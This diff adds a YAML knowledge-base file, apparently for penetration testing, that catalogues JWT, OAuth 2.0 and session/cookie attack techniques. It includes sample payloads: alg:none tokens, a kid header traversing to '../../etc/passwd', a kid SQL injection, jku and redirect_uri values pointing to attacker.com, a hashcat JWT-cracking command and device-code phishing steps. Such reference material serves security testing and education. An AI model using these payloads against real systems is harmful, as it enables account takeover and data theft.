@@ -1,0 +1,159 @@
+# Authentication & Authorization Attack Techniques
+# Category: auth_attack
+
+- title: "JWT Attack — 10 Attack Vectors"
+  content: |
+    ## JWT Attack Vectors
+
+    ### 1. alg:none Attack
+    ```
+    Header: {"alg":"none","typ":"JWT"}
+    Payload: {"user":"admin"}
+    Signature: "" (empty)
+    ```
+    If server accepts `alg:none`, remove signature entirely.
+
+    ### 2. alg Confusion (RS256 → HS256)
+    If server uses RSA (RS256) but also accepts HMAC (HS256):
+    1. Get server's public key (from /.well-known/jwks.json or error messages)
+    2. Change `alg` from RS256 to HS256
+    3. Sign with the public key as HMAC secret
+    4. Server verifies successfully because HS256 treats the RSA public key as HMAC secret
+
+    ### 3. kid Header Injection (Path Traversal)
+    ```
+    Header: {"alg":"HS256","kid":"../../etc/passwd"}
+    Header: {"alg":"HS256","kid":"/dev/null"}
+    ```
+    If `kid` value is used to fetch the signing key file, path traversal reads server files.
+
+    ### 4. kid Header Injection (SQLi)
+    ```
+    Header: {"alg":"HS256","kid":"' UNION SELECT 'secret' --"}
+    ```
+    If `kid` queries a database for the key, SQL injection in kid is possible.
+
+    ### 5. jku/jwk Header Injection
+    ```
+    Header: {"alg":"RS256","jku":"https://attacker.com/jwks.json"}
+    Header: {"alg":"RS256","jwk":{...attacker's public key...}}
+    ```
+    Point jku to attacker-controlled JWKS endpoint or embed attacker's key directly.
+
+    ### 6. x5u/x5c Header Injection
+    Similar to jku/jwk — embedded certificate references.
+
+    ### 7. Empty/Weak HMAC Secret
+    Try `secret`, `password`, `key`, empty string, or app name as HMAC secret.
+    Tools: `hashcat -m 16500 jwt.txt wordlist.txt`
+
+    ### 8. JWE (Encrypted JWT) Nested Attack
+    - Wrap a none-alg JWT inside an encrypted JWE
+    - Server decrypts outer layer, validates inner (none) layer
+    - Bypasses signature check
+
+    ### 9. cty Header Confusion
+    Set `cty` header to `text/xml` to trigger XML parser (XXE through JWT).
+
+    ### 10. Expiry Manipulation
+    ```json
+    {"exp":9999999999,"iat":0,"nbf":0}
+    ```
+  tags: [jwt, authentication, token, rsa, hmac, key-confusion, path-traversal]
+  keywords: [jwt攻击, jwt绕过, token攻击, 无算法, 密钥混淆, kid注入, alg绕过]
+  severity: critical
+  references:
+    - https://portswigger.net/web-security/jwt
+
+- title: "OAuth 2.0 — 10 Attack Techniques"
+  content: |
+    ## OAuth 2.0 Attack Vectors
+
+    ### 1. redirect_uri Open Redirect
+    ```
+    /oauth/authorize?redirect_uri=https://attacker.com/callback&client_id=xxx
+    ```
+    - If whitelist is loose: `redirect_uri=https://trusted.com.attacker.com`
+    - Path traversal: `redirect_uri=https://trusted.com/../../attacker.com/callback`
+    - Parameter injection: `redirect_uri=https://trusted.com%40attacker.com`
+
+    ### 2. CSRF on OAuth Flow
+    - Victim clicks attacker's authorization link
+    - Attacker binds victim's OAuth account to attacker's account
+    - `state` parameter missing → no CSRF protection
+
+    ### 3. Device Code Phishing
+    ```
+    1. Attacker gets device_code + user_code
+    2. Sends user_code to victim (phishing: "enter this code to verify")
+    3. Polls for access_token while victim authorizes
+    4. Gets victim's access_token
+    ```
+
+    ### 4. Implicit Grant Token Leakage
+    - Access token in URL fragment → can be leaked via referer header
+    - Open redirect after authorization leaks token
+
+    ### 5. PKCE Bypass
+    - If PKCE is not enforced on server but client sends it → attacker can skip it
+    - Missing `code_challenge` validation
+
+    ### 6. Client Secret Extraction
+    - Mobile apps / SPAs often hardcode client_secret
+    - Decompile APK/IPA, search for `client_secret`
+
+    ### 7. scope Escalation
+    - Request broader scopes than authorized: `scope=admin+read+write`
+    - Remove scopes and see if defaults to full access
+
+    ### 8. audience (aud) Injection
+    - In JWT-based OAuth, change `aud` to target another service
+    - Common when microservices share the same IdP
+
+    ### 9. COAT Attack (Cross-Origin-Auth-Token)
+    - Browser-based OAuth flow exploitation via cross-origin token theft
+
+    ### 10. Replay Attack
+    - Reuse old authorization codes or tokens
+    - Missing `one-time use` enforcement
+  tags: [oauth, authentication, redirect-uri, csrf, device-code, phishing, pkce]
+  keywords: [oauth攻击, redirect_uri利用, 设备码钓鱼, oauth绕过, 授权码攻击]
+  severity: high
+  references:
+    - https://portswigger.net/web-security/oauth
+
+- title: "Session & Cookie Attacks"
+  content: |
+    ## Session & Cookie Attack Checklist
+
+    ### Session Fixation
+    1. Obtain a valid session ID (e.g., visit /login)
+    2. Trick victim into using that session ID
+    3. Victim logs in → attacker hijacks session
+    4. Mitigation: regenerate session ID on login
+
+    ### Cookie Flags
+    - Missing `HttpOnly` → accessible via JS (XSS → cookie theft)
+    - Missing `Secure` → transmitted over HTTP
+    - Missing `SameSite` → CSRF vulnerable
+    - Weak `Domain` → subdomain cookie injection
+    - Weak `Path` → path cookie injection
+
+    ### JWT in Cookie Attacks
+    - JWT stored in cookie with no HttpOnly → XSS exfiltration
+    - JWT with no signature validation → tampering
+
+    ### Remember-Me Exploitation
+    1. "Remember me" often uses persistent tokens
+    2. Brute-force or predict remember-me tokens
+    3. Tokens stored in localStorage → XSS theft
+    4. Look for token generation patterns (e.g., base64(user:timestamp))
+
+    ### Session Timeout Issues
+    - Infinite session duration
+    - No re-authentication for sensitive actions
+    - Concurrent sessions allowed
+    - Session not invalidated on logout
+  tags: [session, cookie, jwt, fixation, csrf, remember-me]
+  keywords: [会话固定, cookie安全, session攻击, remember-me攻击, 会话管理, 登出绕过]
+  severity: medium
